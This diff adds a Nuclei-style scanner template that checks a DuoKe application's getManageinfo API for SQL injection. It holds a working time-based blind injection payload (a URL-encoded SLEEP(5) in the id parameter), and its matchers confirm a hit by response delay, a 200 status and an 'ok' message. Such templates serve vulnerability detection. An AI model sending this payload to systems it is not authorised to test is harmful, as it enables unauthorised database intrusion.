@@ -1,0 +1,27 @@
+id: DuoKe-getManageinfo-sqlInjection
+
+info:
+  name: DuoKe-getManageinfo-sqlInjection
+  author: iSee857
+  severity: high
+  description: DuoKe-getManageinfo-sqlInjection
+
+requests:
+  - method: GET
+    raw:
+      - |
+        GET /api/index/quanManageList/getManageinfo?id=1%29+AND+%28SELECT+8888+FROM+%28SELECT%28SLEEP%285%29%29%29qBqH%29+AND+%288888%3D888 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5"
+
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - 'msg":"ok'
